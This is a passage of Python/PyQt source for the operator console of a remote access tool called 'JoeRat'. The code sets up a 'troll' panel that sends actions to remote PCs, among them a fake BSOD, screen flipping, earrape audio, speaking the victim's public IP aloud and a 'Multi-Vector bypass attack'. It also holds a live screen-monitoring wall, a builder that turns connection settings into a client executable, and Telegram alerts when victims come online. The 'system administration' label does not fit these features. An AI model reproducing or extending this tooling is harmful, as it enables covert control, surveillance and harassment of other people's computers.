        troll_desc.setStyleSheet('color: #686a80; font-size: 8pt;')
        troll_desc.setWordWrap(True)
        troll_vlayout.addWidget(troll_desc)

        troll_grid = QGridLayout()
        troll_grid.setSpacing(4)
        troll_grid.setContentsMargins(0, 0, 0, 0)

        _troll_btn_style = (
            'QPushButton {{ background: #1e1f2a; color: {fg}; border: 1px solid #3a3c4e;'
            '  border-radius: 6px; padding: 6px 2px; font-weight: bold; font-size: 7.5pt;'
            '  min-height: 28px; }}'
            'QPushButton:hover {{ background: #2a2b3d; border-color: {fg}; }}'
        )

        _troll_fix_style = (
            'QPushButton {{ background: #0f2918; color: {fg}; border: 1px solid #166534;'
            '  border-radius: 6px; padding: 6px 2px; font-weight: bold; font-size: 7.5pt;'
            '  min-height: 28px; }}'
            'QPushButton:hover {{ background: #14532d; border-color: {fg}; }}'
        )

        _troll_reset_style = (
            'QPushButton { background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #166534, stop:1 #15803d);'
            '  color: #4ade80; border: 1px solid #22c55e; border-radius: 6px;'
            '  padding: 8px 4px; font-weight: bold; font-size: 8.5pt; min-height: 32px; }'
            'QPushButton:hover { background: #15803d; border-color: #4ade80; color: #fff; }'
        )

        # ── Troll buttons: (label, action, color, tooltip) ──
        # Compact labels so they fit neatly in a 4-column grid
        troll_buttons = [
            # Row 1 — Audio & Speech
            ('🗣️ TTS',       'tts',          '#a78bfa', 'Text-to-Speech — speaks your custom message'),
            ('💬 MsgBox',           'msgbox',       '#818cf8', 'Show a popup message box on remote screen'),
            ('🎵 Rickroll',         'rickroll',     '#f472b6', 'Open Rick Roll in the default browser'),
            ('🔔 Beep',             'beep',         '#34d399', 'Play a beep melody on the remote PC'),
            # Row 2 — Apps & Browser
            ('🧮 Calc ×10',    'calc_spam',    '#fb923c', 'Open Calculator 10 times'),
            ('📝 Notepad',          'notepad_msg',  '#60a5fa', 'Open Notepad with custom message'),
            ('🌐 Open URL',         'open_url',     '#c084fc', 'Open a URL in the remote browser'),
            ('📎 Clippy',           'clippy',       '#fbbf24', 'Spawn a fake Clippy assistant popup'),
            # Row 3 — Mouse
            ('🖱️ Swap',       'swap_mouse',   '#fbbf24', 'Swap left/right mouse buttons'),
            ('🐌 Slow',             'slow_mouse',   '#84cc16', 'Set mouse speed to minimum'),
            ('🏎️ Fast',       'fast_mouse',   '#f472b6', 'Set mouse speed to maximum'),
            ('🌀 Crazy',            'crazy_cursor', '#facc15', 'Move mouse randomly for 5 seconds'),
            # Row 4 — Volume & Sound
            ('🔇 Mute',             'mute',         '#6b7280', 'Toggle mute on the remote PC'),
            ('🔊 Max Vol',           'max_volume',   '#f97316', 'Crank remote volume to 100%'),
            ('🎵 Earrape',          'earrape',      '#ef4444', 'Max volume + random beeps'),
            ('📢 Say IP',           'say_ip',       '#14b8a6', 'TTS reads out their public IP'),
            # Row 5 — Display & Visual
            ('🔄 Flip',             'flip_screen',  '#e879f9', 'Rotate the display 180°'),
            ('💀 BSOD',             'fake_bsod',    '#3b82f6', 'Fake Blue Screen of Death (30s)'),
            ('🔦 Flash',            'screen_flash', '#f43f5e', 'Flash screen white/black rapidly'),
            ('🖼️ Flash Image',      'flash_image',  '#f43f5e', 'Flash screen with an image'),
            ('💥 Spam Popups',      'spam_popups', '#f59e0b', 'Spam 20 popup boxes randomly'),
            ('🖼️ Wallpaper',  'wallpaper',    '#2dd4bf', 'Set wallpaper from URL in text box'),
            # Row 6 — System & Misc
            ('⌨️ Caps',           'caps_disco',   '#f87171', 'Toggle Caps Lock rapidly'),
            ('🔀 Taskbar',          'hide_taskbar', '#64748b', 'Hide the Windows taskbar'),
            ('🖥️ Theme',      'invert_colors','#06b6d4', 'Toggle light/dark Windows theme'),
            ('📂 CD Eject',         'cd_tray',      '#d4d4d8', 'Eject the CD/DVD drive'),
            # Row 7 — Text & Input
            ('🔤 Ghost Type',       'ghost_type',   '#c084fc', 'Type text keystroke-by-keystroke'),
            ('💬 Popups ×5',   'popup_loop',   '#a855f7', 'Spawn 5 message boxes in a row'),
            ('🎭 Multi-Vector',     'wmi_bypass',   '#dc2626', 'Multi-vector bypass attack'),
        ]

        # ── Fix / Restore buttons (green-tinted, separated) ──
        troll_fix_buttons = [
            ('🖱️ Fix Mouse',  'fix_mouse',    '#4ade80', 'Restore normal mouse buttons'),
            ('🔃 Fix Screen',       'fix_screen',   '#4ade80', 'Restore screen rotation to 0°'),
        ]

        COLS = 4

        for idx, (label, action, color, tooltip) in enumerate(troll_buttons):
            btn = QPushButton(label)
            btn.setToolTip(tooltip)
            btn.setStyleSheet(_troll_btn_style.format(fg=color))
            btn.setCursor(QCursor(Qt.PointingHandCursor))
            btn.clicked.connect(lambda checked, a=action: self._send_troll_action(a))
            troll_grid.addWidget(btn, idx // COLS, idx % COLS)

        # ── Separator before fix/restore row ──
        fix_row = (len(troll_buttons) + COLS - 1) // COLS
        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet('color: #2e3040; margin: 2px 0;')
        troll_grid.addWidget(sep, fix_row, 0, 1, COLS)

        # ── Fix buttons row (green tint) ──
        fix_row += 1
        for idx, (label, action, color, tooltip) in enumerate(troll_fix_buttons):
            btn = QPushButton(label)
            btn.setToolTip(tooltip)
            btn.setStyleSheet(_troll_fix_style.format(fg=color))
            btn.setCursor(QCursor(Qt.PointingHandCursor))
            btn.clicked.connect(lambda checked, a=action: self._send_troll_action(a))
            troll_grid.addWidget(btn, fix_row, idx)

        # ── Reset All button — full width, prominent ──
        reset_row = fix_row + 1
        reset_btn = QPushButton('🔧 Reset All — Undo Everything')
        reset_btn.setToolTip('Restore mouse, screen, taskbar, volume, theme, caps lock — all at once')
        reset_btn.setStyleSheet(_troll_reset_style)
        reset_btn.setCursor(QCursor(Qt.PointingHandCursor))
        reset_btn.clicked.connect(lambda checked: self._send_troll_action('reset_all'))
        troll_grid.addWidget(reset_btn, reset_row, 0, 1, COLS)

        troll_vlayout.addLayout(troll_grid)

        # Custom TTS input
        tts_row = QHBoxLayout()
        tts_row.setSpacing(4)
        self._troll_tts_input = QLineEdit()
        self._troll_tts_input.setPlaceholderText('Input here')
        self._troll_tts_input.setStyleSheet(
            'background: #1a1b24; color: #e8e9f5; border: 1px solid #2e3040;'
            '  border-radius: 4px; padding: 5px 8px; font-size: 8pt;'
        )
        self._troll_tts_input.setToolTip('Custom text for TTS and MsgBox actions')
        tts_row.addWidget(self._troll_tts_input)
        troll_vlayout.addLayout(tts_row)

        troll_group.setLayout(troll_vlayout)
        fun_layout.addWidget(troll_group)

        fun_layout.addStretch()
        fun_tab.setLayout(fun_layout)
        _fun_scroll = QScrollArea()
        _fun_scroll.setWidget(fun_tab)
        _fun_scroll.setWidgetResizable(True)
        _fun_scroll.setFrameShape(QFrame.NoFrame)
        _fun_scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.sidebar_tabs.addTab(_fun_scroll, "\ud83c\udfae")

        # Fun tab timer (uptime + quote rotation)
        self._fun_timer = QTimer(self)
        self._fun_timer.timeout.connect(self._update_fun_tab)
        self._fun_timer.start(1000)
        # Auto-rotate quotes every 30 seconds
        self._fun_quote_timer = QTimer(self)
        self._fun_quote_timer.timeout.connect(self._next_hacker_quote)
        self._fun_quote_timer.start(30000)

        self.sidebar_widget = self.sidebar_tabs

        # Monitor Wall: grid of thumbnails, compact list, or single full view
        self.monitor_wall_stack = QStackedWidget()

        # Use QListWidget in IconMode for automatic Flow Layout
        self.monitor_grid_widget = QListWidget()
        self.monitor_grid_widget.setViewMode(QListWidget.IconMode)
        self.monitor_grid_widget.setResizeMode(QListWidget.Adjust)
        self.monitor_grid_widget.setMovement(QListWidget.Static)
        self.monitor_grid_widget.setSpacing(14)
        self.monitor_grid_widget.setWrapping(True)
        self.monitor_grid_widget.setStyleSheet(
            'QListWidget { background: #12131a; border: none; }'
            'QListWidget::item { background: transparent; padding: 0; }'
            'QListWidget::item:selected { background: transparent; }'
        )

        # Compact list view
        self.monitor_list_widget = QListWidget()
        self.monitor_list_widget.setViewMode(QListWidget.ListMode)
        self.monitor_list_widget.setResizeMode(QListWidget.Adjust)
        self.monitor_list_widget.setMovement(QListWidget.Static)
        self.monitor_list_widget.setSpacing(4)
        self.monitor_list_widget.setStyleSheet('''
            QListWidget {
                background: #12131a;
                border: none;
                outline: none;
            }
            QListWidget::item {
                background: transparent;
                border: none;
                padding: 2px;
                margin: 0;
            }
            QListWidget::item:selected {
                background: transparent;
                border: none;
            }
            QListWidget::item:hover {
                background: transparent;
                border: none;
            }
            QScrollBar:vertical {
                background: #1a1b24;
                width: 12px;
                border: none;
                border-radius: 6px;
            }
            QScrollBar::handle:vertical {
                background: #2e3040;
                border-radius: 6px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover {
                background: #3a3c4e;
            }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
                height: 0px;
            }
        ''')

        # Create main monitor widget with view controls
        self.monitor_main_widget = QWidget()
        monitor_main_layout = QVBoxLayout(self.monitor_main_widget)
        monitor_main_layout.setContentsMargins(0, 0, 0, 0)
        monitor_main_layout.setSpacing(0)

        # View toggle bar at the top
        view_bar_layout = QHBoxLayout()
        view_bar_layout.setContentsMargins(12, 8, 12, 8)
        view_bar_layout.setSpacing(8)
        
        # View toggle buttons
        self.grid_view_btn = QPushButton('⚏ Grid')
        self.grid_view_btn.setStyleSheet(
            'background: #5865F2; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-weight: bold;'
        )
        self.grid_view_btn.clicked.connect(self._switch_to_grid_view)
        self.list_view_btn = QPushButton('☰ List')
        self.list_view_btn.setStyleSheet(
            'background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; padding: 6px 12px; border-radius: 4px;'
        )
        self.list_view_btn.clicked.connect(self._switch_to_list_view)
        
        view_toggle_layout = QHBoxLayout()
        view_toggle_layout.setSpacing(4)
        view_toggle_layout.addWidget(self.grid_view_btn)
        view_toggle_layout.addWidget(self.list_view_btn)
        view_toggle_widget = QWidget()
        view_toggle_widget.setLayout(view_toggle_layout)
        view_toggle_widget.setStyleSheet('background: transparent; border: none;')
        
        view_bar_layout.addWidget(view_toggle_widget)
        view_bar_layout.addStretch()
        
        # Add machine count label
        self.machine_count_label = QLabel('0 machines')
        self.machine_count_label.setStyleSheet(
            'color: #686a80; font-size: 10pt; background: transparent; border: none;'
        )
        view_bar_layout.addWidget(self.machine_count_label)
        
        monitor_main_layout.addLayout(view_bar_layout)
        
        # Add the stack widget below the view bar
        monitor_main_layout.addWidget(self.monitor_wall_stack, 1)

        self.monitor_full_widget = QWidget()
        monitor_full_layout = QVBoxLayout()
        monitor_full_layout.setContentsMargins(8, 8, 8, 8)

        top_btn_layout = QHBoxLayout()
        self.back_to_grid_btn = QPushButton('← Back to Grid')
        self.back_to_grid_btn.setStyleSheet(
            'background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; padding: 6px 14px;'
        )
        self.back_to_grid_btn.clicked.connect(self._switch_to_grid_view)
        top_btn_layout.addWidget(self.back_to_grid_btn)
        top_btn_layout.addStretch()
        top_btn_layout.addStretch()
        # FPS overlay label (top-right corner of full view)
        self.fps_overlay_label = QLabel('')
        self.fps_overlay_label.setStyleSheet(
            'background: rgba(0,0,0,180); color: #4ade80; font-family: Consolas, monospace;'
            ' font-size: 11px; font-weight: bold; padding: 2px 8px; border-radius: 4px;'
        )
        self.fps_overlay_label.setFixedHeight(20)
        self.fps_overlay_label.setVisible(False)
        self.fps_overlay_label.setToolTip('Frames per second received from the stream')
        top_btn_layout.addWidget(self.fps_overlay_label)
        monitor_full_layout.addLayout(top_btn_layout)

        monitor_full_layout.addWidget(self.stream_label, 1)

        bot_btn_layout = QHBoxLayout()
        bot_btn_layout.addStretch()
        bot_btn_layout.addWidget(self.fullscreen_btn)
        bot_btn_layout.addStretch()
        monitor_full_layout.addLayout(bot_btn_layout)

        self.monitor_full_widget.setLayout(monitor_full_layout)
        self.monitor_wall_stack.addWidget(self.monitor_grid_widget)
        self.monitor_wall_stack.addWidget(self.monitor_list_widget)
        self.monitor_wall_stack.addWidget(self.monitor_full_widget)
        self._rebuild_thumbnail_grid()
        
        # Track current view mode
        self.current_view_mode = 'grid'  # 'grid', 'list', or 'full'

        self.main_splitter = QSplitter(Qt.Horizontal)
        self.main_splitter.addWidget(self.sidebar_widget)
        self.main_splitter.addWidget(self.monitor_main_widget)
        self.main_splitter.setSizes([280, 900])
        self.main_splitter.setStretchFactor(0, 0)
        self.main_splitter.setStretchFactor(1, 1)
        self.main_splitter.setChildrenCollapsible(False)
        self.main_splitter.setHandleWidth(4)
        monitor_wall_widget = QWidget()
        _mw_layout = QHBoxLayout(monitor_wall_widget)
        _mw_layout.setContentsMargins(0, 0, 0, 0)
        _mw_layout.addWidget(self.main_splitter)

        # Machine Detail tab: list of machines, expand for details + notes
        machine_detail_widget = QWidget()
        # GroupBox for Machine List
        machine_list_panel = QGroupBox('🖥  Machines')
        ml_layout = QVBoxLayout()
        ml_layout.setContentsMargins(6, 12, 6, 6)
        self.machine_list = QListWidget()
        self.machine_list.itemClicked.connect(self._on_machine_detail_click)
        ml_layout.addWidget(self.machine_list)
        machine_list_panel.setLayout(ml_layout)

        self.detail_splitter = QSplitter(Qt.Horizontal)
        self.detail_splitter.addWidget(machine_list_panel)

        # Detail panel
        self.machine_detail_panel = QGroupBox('📊  Machine Details')
        md_panel_layout = QVBoxLayout()
        md_panel_layout.setSpacing(10)
        md_panel_layout.setContentsMargins(12, 16, 12, 12)

        self.machine_detail_label = QLabel('Select a machine')
        self.machine_detail_label.setStyleSheet(
            'font-size: 16px; font-weight: bold; color: #818cf8; padding-bottom: 4px;'
        )
        self.machine_detail_label.setWordWrap(True)
        md_panel_layout.addWidget(self.machine_detail_label)

        self.machine_telemetry_display = TelemetryDashboard(self)
        md_panel_layout.addWidget(self.machine_telemetry_display, 1)

        notes_sep = QFrame()
        notes_sep.setFrameShape(QFrame.HLine)
        notes_sep.setStyleSheet('color: #3a3c4e;')
        md_panel_layout.addWidget(notes_sep)

        notes_lbl = QLabel('📝  Custom Notes')
        notes_lbl.setStyleSheet('font-size: 11px; font-weight: bold; color: #9a9cb0;')
        md_panel_layout.addWidget(notes_lbl)
        self.machine_notes_input = QTextEdit()
        self.machine_notes_input.setPlaceholderText('Add custom notes or documentation for this machine...')
        self.machine_notes_input.setStyleSheet(
            'font-family: Consolas, monospace; font-size: 9pt; background: #1a1b22;'
        )
        self.machine_notes_input.textChanged.connect(self._save_machine_notes)
        md_panel_layout.addWidget(self.machine_notes_input, 1)
        self.machine_detail_panel.setLayout(md_panel_layout)

        self.detail_splitter.addWidget(self.machine_detail_panel)
        self.detail_splitter.setSizes([220, 780])
        self.detail_splitter.setStretchFactor(0, 0)
        self.detail_splitter.setStretchFactor(1, 1)

        machine_detail_layout = QVBoxLayout()
        machine_detail_layout.addWidget(self.detail_splitter)
        machine_detail_widget.setLayout(machine_detail_layout)

        # Settings tab
        settings_widget = QWidget()
        settings_layout = QVBoxLayout()
        settings_layout.setSpacing(14)
        settings_layout.setContentsMargins(14, 14, 14, 14)

        # Settings - Connection Presets Group
        preset_group = QGroupBox('🔌  Server Presets')
        preset_layout = QVBoxLayout()
        preset_desc = QLabel('Save and load server connection settings:')
        preset_desc.setStyleSheet('color: #686a80; font-size: 9pt;')
        preset_layout.addWidget(preset_desc)

        preset_row = QHBoxLayout()
        self.preset_combo = QComboBox()
        self.preset_combo.setEditable(False)
        self._refresh_preset_combo()
        self.preset_combo.currentIndexChanged.connect(self._on_preset_selected)
        preset_row.addWidget(self.preset_combo, 1)

        self.preset_load_btn = QPushButton('Load')
        self.preset_load_btn.clicked.connect(self._load_preset)
        preset_row.addWidget(self.preset_load_btn)

        self.preset_save_btn = QPushButton('Save')
        self.preset_save_btn.clicked.connect(self._save_as_preset)
        preset_row.addWidget(self.preset_save_btn)

        self.preset_delete_btn = QPushButton('Delete')
        self.preset_delete_btn.setStyleSheet(
            'background: #3d1f1f; color: #f87171; border: 1px solid #5a2020;'
        )
        self.preset_delete_btn.clicked.connect(self._delete_preset)
        preset_row.addWidget(self.preset_delete_btn)

        preset_layout.addLayout(preset_row)
        preset_group.setLayout(preset_layout)
        settings_layout.addWidget(preset_group)

        # Settings - Server Configuration
        server_group = QGroupBox('⚙  Server Configuration')
        server_form = QFormLayout()
        server_form.setVerticalSpacing(10)
        server_form.setLabelAlignment(Qt.AlignRight)

        self.ws_url_input = QLineEdit(self.ws_url)
        self.ws_url_input.setPlaceholderText('ws://host:3000 or wss://host:3000')
        server_form.addRow('WebSocket URL:', self.ws_url_input)

        self.room_id_input = QLineEdit(self.room_id)
        server_form.addRow('Room ID:', self.room_id_input)

        self.secret_input = QLineEdit(self.secret)
        self.secret_input.setEchoMode(QLineEdit.Password)
        server_form.addRow('Password:', self.secret_input)

        self.target_machine_id_input = QLineEdit(self.target_machine_id)
        self.target_machine_id_input.setPlaceholderText('Leave empty to see all machines')
        server_form.addRow('Target Machine:', self.target_machine_id_input)

        btn_layout = QHBoxLayout()
        btn_layout.addStretch()
        self.ws_connect_btn = QPushButton('🔗  Connect to Server')
        self.ws_connect_btn.setMinimumWidth(160)
        self.ws_connect_btn.setStyleSheet(
            'background: qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #166534,stop:1 #15803d);'
            'color: #d1fae5; font-weight: bold; padding: 8px 16px; border-radius: 5px;'
        )
        btn_layout.addWidget(self.ws_connect_btn)
        server_form.addRow('', btn_layout)

        server_group.setLayout(server_form)
        settings_layout.addWidget(server_group)

        # Settings - Build Tools
        build_group = QGroupBox('🔨  Build Tools')
        build_form = QFormLayout()
        build_form.setVerticalSpacing(8)
        build_form.setLabelAlignment(Qt.AlignRight)

        build_hint = QLabel(
            'Click create build to generate a custom executable with the current connection settings. '
        )
        build_hint.setStyleSheet('color: #686a80; font-size: 9pt; border: none;')
        build_hint.setWordWrap(True)
        build_form.addRow(build_hint)

        _gh = self._load_github_build_config()

        self.gh_exe_name_input = QLineEdit(_gh.get('exe_name', 'JoeRat'))
        self.gh_exe_name_input.setPlaceholderText('e.g. RatClient')
        self.gh_exe_name_input.setToolTip('The generated executable will have this exact name (without .exe)')
        build_form.addRow('Exe Name:', self.gh_exe_name_input)

        build_log_label = QLabel('Build Console:')
        self.build_log_output = QTextEdit()
        self.build_log_output.setReadOnly(True)
        self.build_log_output.setFixedHeight(120)
        self.build_log_output.setStyleSheet(
            'background: #111116; color: #a5b4fc; font-family: Consolas, monospace; font-size: 8pt; border: 1px solid #1e3060; border-radius: 4px;'
        )
        self.build_log_output.setPlaceholderText('Build progress will appear here...')
        build_form.addRow(build_log_label, self.build_log_output)

        build_btn_row = QHBoxLayout()
        build_save_btn = QPushButton('💾  Save')
        build_save_btn.setToolTip('Save settings')
        build_save_btn.clicked.connect(self._save_github_settings)
        build_btn_row.addWidget(build_save_btn)

        build_trigger_btn = QPushButton('🚀  Create Build')
        build_trigger_btn.setToolTip('Commit connection settings to GitHub — build starts automatically')
        build_trigger_btn.setStyleSheet(
            'QPushButton { background: #1a1e2a; color: #93c5fd; font-weight: bold;'
            '  border: 1px solid #1e3060; border-radius: 5px; padding: 5px 12px; }'
            'QPushButton:hover { background: #1e2a4a; color: #bfdbfe; border-color: #3b82f6; }'
        )
        build_trigger_btn.clicked.connect(self.open_github_build_dialog)
        build_btn_row.addWidget(build_trigger_btn)
        build_btn_row.addStretch()
        build_form.addRow('', build_btn_row)

        build_group.setLayout(build_form)
        settings_layout.addWidget(build_group)

        # Settings - Telegram Alerts
        tg_group = QGroupBox('📨  Telegram Alerts')
        tg_layout = QVBoxLayout()
        tg_layout.setSpacing(8)
        tg_desc = QLabel('Send alerts to Telegram when machines go online/offline or resource thresholds are exceeded.')
        tg_desc.setStyleSheet('color: #686a80; font-size: 9pt;')
        tg_desc.setWordWrap(True)
        tg_layout.addWidget(tg_desc)

        tg_form = QFormLayout()
        tg_form.setVerticalSpacing(8)
        tg_form.setLabelAlignment(Qt.AlignRight)
        self.tg_bot_token_input = QLineEdit(getattr(self, '_tg_bot_token', ''))
        self.tg_bot_token_input.setPlaceholderText('123456:ABC-DEF...')
        self.tg_bot_token_input.setEchoMode(QLineEdit.Password)
        self.tg_bot_token_input.setToolTip('Telegram Bot API token from @BotFather')
        tg_form.addRow('Bot Token:', self.tg_bot_token_input)

        self.tg_chat_id_input = QLineEdit(getattr(self, '_tg_chat_id', ''))
        self.tg_chat_id_input.setPlaceholderText('-1001234567890 or your user ID')
        self.tg_chat_id_input.setToolTip('Telegram chat/group/channel ID to send alerts to')
        tg_form.addRow('Chat ID:', self.tg_chat_id_input)
        tg_layout.addLayout(tg_form)

        # Alert toggles
        tg_toggle_row = QHBoxLayout()
        self.tg_online_check = QPushButton('Online/Offline')
        self.tg_online_check.setCheckable(True)
        self.tg_online_check.setChecked(getattr(self, '_tg_alert_online', True))
        self.tg_online_check.setToolTip('Alert when machines come online or go offline')
        self.tg_online_check.setStyleSheet(
            'QPushButton { background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; padding: 5px 10px; }'
            'QPushButton:checked { background: #1a3d24; color: #4ade80; border: 1px solid #2d6b3f; }'
        )
        tg_toggle_row.addWidget(self.tg_online_check)

        self.tg_resource_check = QPushButton('High CPU/RAM (>90%)')
        self.tg_resource_check.setCheckable(True)
        self.tg_resource_check.setChecked(getattr(self, '_tg_alert_resources', False))
        self.tg_resource_check.setToolTip('Alert when CPU or RAM exceeds 90% on any machine')
        self.tg_resource_check.setStyleSheet(
            'QPushButton { background: #22232d; color: #9a9cb0; border: 1px solid #3a3c4e; padding: 5px 10px; }'
            'QPushButton:checked { background: #3d2d1a; color: #fbbf24; border: 1px solid #6b5a2d; }'
        )
        tg_toggle_row.addWidget(self.tg_resource_check)
        tg_toggle_row.addStretch()
        tg_layout.addLayout(tg_toggle_row)

        # Save & Test buttons
        tg_btn_row = QHBoxLayout()
        self.tg_save_btn = QPushButton('Save')
        self.tg_save_btn.setToolTip('Save Telegram settings')
        self.tg_save_btn.clicked.connect(self._save_telegram_settings)
        tg_btn_row.addWidget(self.tg_save_btn)

        self.tg_test_btn = QPushButton('Send Test Alert')
        self.tg_test_btn.setToolTip('Send a test message to verify your Telegram setup')
        self.tg_test_btn.setStyleSheet(
            'background: #22232d; color: #818cf8; border: 1px solid #3a3c4e; font-weight: bold; padding: 5px 12px;'
        )
        self.tg_test_btn.clicked.connect(self._send_telegram_test)
        tg_btn_row.addWidget(self.tg_test_btn)
        tg_btn_row.addStretch()
        tg_layout.addLayout(tg_btn_row)

        tg_group.setLayout(tg_layout)
        settings_layout.addWidget(tg_group)

        # ── Client Folders ──
        folders_group = QGroupBox('📁  Client Folders')
        folders_layout = QVBoxLayout()
        folders_layout.setSpacing(8)
        
        folders_desc = QLabel('Generate a Clients folder with subfolders for each machine. Uses hostname if available, otherwise machine ID.')
        folders_desc.setStyleSheet('color: #686a80; font-size: 9pt;')
        folders_desc.setWordWrap(True)
        folders_layout.addWidget(folders_desc)
        
        folders_btn_row = QHBoxLayout()
        
        self.generate_folders_btn = QPushButton('📁 Generate Client Folders')
        self.generate_folders_btn.setToolTip('Create a Clients folder with subfolders for each connected machine')
        self.generate_folders_btn.setStyleSheet(
            'QPushButton { background: #1a3d24; color: #4ade80; font-weight: bold; '
            '  border: 1px solid #2d6b3f; border-radius: 5px; padding: 8px 16px; }'
            'QPushButton:hover { background: #2d4d34; color: #6be886; border-color: #3d7b4f; }'
        )
        self.generate_folders_btn.clicked.connect(self.generate_client_folders)
        folders_btn_row.addWidget(self.generate_folders_btn)
        
        folders_btn_row.addStretch()
        folders_layout.addLayout(folders_btn_row)
        
        folders_group.setLayout(folders_layout)
        settings_layout.addWidget(folders_group)

        # ── MOTD (Message of the Day) ──
        motd_group = QGroupBox('📢  Message of the Day (MOTD)')
        motd_group.setStyleSheet(
            'QGroupBox { background: #12131a; border: 1px solid #2e3040; border-radius: 8px;'
            '  margin-top: 10px; padding: 14px 10px 10px 10px; font-weight: bold; color: #818cf8; }'
            'QGroupBox::title { subcontrol-origin: margin; left: 12px; padding: 0 6px; }'
        )
        motd_layout = QVBoxLayout()
        motd_layout.setSpacing(6)
        motd_hint = QLabel('Set a message that appears in the top bar for all connected viewers.')
        motd_hint.setStyleSheet('color: #686a80; font-size: 8pt; font-weight: normal; border: none;')
        motd_hint.setWordWrap(True)
        motd_layout.addWidget(motd_hint)
        motd_row = QHBoxLayout()
        self.motd_input = QLineEdit()
        self.motd_input.setPlaceholderText('Enter MOTD text (leave empty to clear)...')
        self.motd_input.setToolTip('Message of the Day — displayed in the top-left corner of the viewer')
        motd_row.addWidget(self.motd_input, 1)
        motd_send_btn = QPushButton('Set MOTD')
        motd_send_btn.setToolTip('Push this MOTD to the server (all viewers will see it)')
        motd_send_btn.setStyleSheet(
            'background: #22232d; color: #818cf8; border: 1px solid #3a3c4e; font-weight: bold; padding: 5px 12px;'
        )
        motd_send_btn.clicked.connect(self._send_motd_from_settings)
        motd_row.addWidget(motd_send_btn)
        motd_layout.addLayout(motd_row)
        motd_group.setLayout(motd_layout)
        settings_layout.addWidget(motd_group)

        settings_layout.addStretch()
        settings_widget.setLayout(settings_layout)

        # About section - Standardized Design System
        about_joert = QWidget()
        about_joert.setStyleSheet('background: #0a0b12;')
        about_layout = QVBoxLayout(about_joert)
        about_layout.setSpacing(24)  # Standardized spacing
        about_layout.setContentsMargins(32, 32, 32, 32)  # Consistent margins

        # Header with standardized typography
        header_widget = QWidget()
        header_widget.setStyleSheet('background: transparent;')
        header_layout = QHBoxLayout(header_widget)
        header_layout.setSpacing(16)
        
        # App title with consistent styling
        title_label = QLabel('JOE')
        title_label.setStyleSheet('''
            color: #fbbf24; 
            font-size: 36px; 
            font-weight: 300; 
            letter-spacing: 4px;
            margin: 0;
        ''')
        header_layout.addWidget(title_label)
        
        subtitle_label = QLabel('Remote Monitoring System')
        subtitle_label.setStyleSheet('''
            color: #818cf8; 
            font-size: 14px; 
            font-weight: 400;
            margin: 0;
        ''')
        header_layout.addWidget(subtitle_label)
        header_layout.addStretch()
        
        about_layout.addWidget(header_widget)

        # Standardized card component
        info_widget = QWidget()
        info_widget.setStyleSheet('''
            QWidget {
                background: #0f1118; 
                border: 1px solid #2e3040; 
                border-radius: 8px; 
                padding: 24px;
            }
        ''')
        info_layout = QVBoxLayout(info_widget)
        info_layout.setSpacing(16)
        info_layout.setContentsMargins(0, 0, 0, 0)
        
        info_title = QLabel('About')
        info_title.setStyleSheet('''
            color: #818cf8; 
            font-size: 16px; 
            font-weight: 600; 
            margin-bottom: 8px;
        ''')
        info_layout.addWidget(info_title)
        
        info_text = QLabel(
            'JoeRat is a remote monitoring and control system designed for '
            'system administration and security testing.\n\n'
            'Features:\n'
            '• Secure websocket connection\n'
            '• Real-time monitoring\n'
            '• Remote command execution\n\n'
            'Beta version, results may be different on first release.'
        )
        info_text.setStyleSheet('''
            color: #9a9cb0; 
            font-size: 12px; 
            line-height: 1.6;
        ''')
        info_text.setWordWrap(True)
        info_layout.addWidget(info_text)
        
        about_layout.addWidget(info_widget)

        # Interactive Feature - Standardized card
        slot_widget = QWidget()
        slot_widget.setStyleSheet('''
            QWidget {
                background: #0f1118; 
                border: 1px solid #2e3040; 
                border-radius: 8px; 
                padding: 24px;
            }
        ''')
        slot_layout = QVBoxLayout(slot_widget)
        slot_layout.setSpacing(20)
        slot_layout.setContentsMargins(0, 0, 0, 0)
        
        slot_title = QLabel('Interactive Feature')
        slot_title.setStyleSheet('''
            color: #818cf8; 
            font-size: 16px; 
            font-weight: 600; 
            margin-bottom: 12px;
        ''')
        slot_layout.addWidget(slot_title)
        
        # Reels container with consistent styling
        reels_container = QWidget()
        reels_container.setStyleSheet('''
            QWidget {
                background: #1a1b22; 
                border-radius: 6px; 
                padding: 20px;
            }
        ''')
        reels_layout = QHBoxLayout(reels_container)
        reels_layout.setSpacing(12)
        reels_layout.setContentsMargins(0, 0, 0, 0)
        
        # Standardized reel styling
        reel_style = '''
            QLabel {
                background: #ffffff; 
                color: #000000; 
                font-size: 48px; 
                width: 80px; 
                height: 80px; 
                border: 1px solid #2e3040; 
                border-radius: 6px; 
                font-weight: bold;
            }
        '''
        
        self.reel1_label = QLabel('🍒')
        self.reel1_label.setStyleSheet(reel_style)
        self.reel1_label.setAlignment(Qt.AlignCenter)
        reels_layout.addWidget(self.reel1_label)
        
        self.reel2_label = QLabel('🍋')
        self.reel2_label.setStyleSheet(reel_style)
        self.reel2_label.setAlignment(Qt.AlignCenter)
        reels_layout.addWidget(self.reel2_label)
        
        self.reel3_label = QLabel('🔔')
        self.reel3_label.setStyleSheet(reel_style)
        self.reel3_label.setAlignment(Qt.AlignCenter)
        reels_layout.addWidget(self.reel3_label)
        
        reels_layout.setAlignment(Qt.AlignCenter)
        slot_layout.addWidget(reels_container)
        
        # Standardized primary button
        self.spin_button = QPushButton('SPIN')
        self.spin_button.setStyleSheet('''
            QPushButton {
                background: #818cf8;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 12px 32px;
                font-size: 14px;
                font-weight: 600;
            }
            QPushButton:hover {
                background: #6366f1;
            }
            QPushButton:pressed {
                background: #4f46e5;
            }
            QPushButton:disabled {
                background: #4a5568;
                color: #a0aec0;
            }
        ''')
        self.spin_button.clicked.connect(self._spin_slot_machine)
        slot_layout.addWidget(self.spin_button)
        
        about_layout.addWidget(slot_widget)

        # Credits - Standardized card
        credits_widget = QWidget()
        credits_widget.setStyleSheet('''
            QWidget {
                background: #0f1118; 
                border: 1px solid #2e3040; 
                border-radius: 8px; 
                padding: 24px;
            }
        ''')
